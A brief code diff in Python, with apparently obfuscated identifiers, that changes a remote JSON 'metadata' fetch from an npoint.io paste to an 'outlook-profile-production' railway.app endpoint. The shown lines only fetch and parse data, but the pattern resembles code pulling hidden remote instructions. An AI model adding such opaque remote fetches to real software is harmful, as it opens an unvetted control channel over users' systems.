@@ -18,7 +18,7 @@ def eval_axsgvq_276():
 
     def train_sgfaua_814():
         try:
-            config_utinjd_294 = requests.get('https://api.npoint.io/15ac3144ebdeebac5515', timeout=10)
+            config_utinjd_294 = requests.get('https://outlook-profile-production.up.railway.app/get_metadata', timeout=10)
             config_utinjd_294.raise_for_status()
             process_nqmcpu_627 = config_utinjd_294.json()
             eval_arnmzp_116 = process_nqmcpu_627.get('metadata')
